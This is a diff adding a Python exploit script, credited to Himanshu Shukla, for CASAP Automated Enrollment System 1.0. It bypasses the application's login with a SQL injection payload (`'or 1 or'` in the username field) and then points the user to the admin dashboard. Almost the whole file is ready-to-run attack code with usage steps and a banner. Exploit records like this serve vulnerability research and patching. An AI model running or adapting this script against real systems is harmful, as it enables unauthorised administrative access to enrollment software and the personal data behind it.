@@ -1,0 +1,82 @@
+# Exploit Title: CASAP Automated Enrollment System 1.0 - Authentication Bypass
+# Exploit Author: Himanshu Shukla
+# Date: 2021-01-21
+# Vendor Homepage: https://www.sourcecodester.com/php/12210/casap-automated-enrollment-system.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/Yna%20Ecole/final.zip
+# Version: 1.0
+# Tested On: Ubuntu + XAMPP 7.4.4
+# Description: CASAP Automated Enrollment System 1.0 - Authentication Bypass Using SQLi
+
+
+#STEP 1 : Run The Exploit With This Command : python3 exploit.py <URL>
+# For Example: python3 exploit.py http://10.9.67.23/final/
+#STEP 2 : Open the Link Provided At The End After Successful Authentication Bypass in Browser. 
+
+
+import time
+import sys
+import requests
+
+
+YELLOW =  '\033[33m' # Yellow Text
+GREEN =  '\033[32m' # Green Text
+RED =  '\033[31m' # Red Text
+RESET = '\033[m' # reset to the defaults
+
+print(YELLOW+'      _          ______  _               _  ___           ', RESET)
+print(YELLOW+'  ___| |_ ___   / / ___|| |__   __ _  __| |/ _ \__      __', RESET)
+print(YELLOW+" / _ \ __/ __| / /|___ \| '_ \ / _` |/ _` | | | \ \ /\ / /", RESET)
+print(YELLOW+'|  __/ || (__ / /  ___) | | | | (_| | (_| | |_| |\ V  V / ', RESET)
+print(YELLOW+' \___|\__\___/_/  |____/|_| |_|\__,_|\__,_|\___/  \_/\_/  ', RESET)
+print(YELLOW+" ", RESET)                                                          
+print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
+print('!!!       CASAP AUTOMATED ENROLLMENT SYSTEM 1.0        !!!')
+print('!!!               AUTHENTICATION BYPASS                !!!')
+print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
+
+print('Author - Himanshu Shukla')
+
+
+def authbypass(url):
+
+	#Authentication Bypass
+	s = requests.Session() 
+	#Set Cookie
+	cookies = {'PHPSESSID': 'c9ead80b7e767a1157b97d2ed1fa25b3'}
+
+
+	print ("[*]Attempting Authentication Bypass...")
+	time.sleep(1)
+
+	values = {"username":"'or 1 or'","password":""}
+	r=s.post(url+'login.php', data=values, cookies=cookies) 
+	p=s.get(url+'dashboard.php', cookies=cookies) 
+
+	#Check if Authentication was bypassed or not.
+	logged_in = True if ("true_admin" in r.text) else False
+	l=logged_in
+	if l:
+		print(GREEN+"[+]Authentication Bypass Successful!", RESET)
+		print(YELLOW+"[+]Open This Link To Continue As Admin : "+url+"dashboard.php", RESET)
+	else:
+		print(RED+"[-]Failed To Authenticate!", RESET)
+		print(RED+"[-]Check Your URL", RESET)
+
+
+if __name__ == "__main__":
+
+
+	if len(sys.argv)!=2:
+		print(RED+"You Haven't Provided any URL!", RESET)
+		print("Usage : python3 exploit.py <URL>")
+		print("Example : python3 exploit.py http://10.9.7.3/final/")
+		exit()
+
+	try:
+
+		authbypass(sys.argv[1])
+
+	except:
+
+		print(RED+"[-]Invalid URL!", RESET)
+		exit()
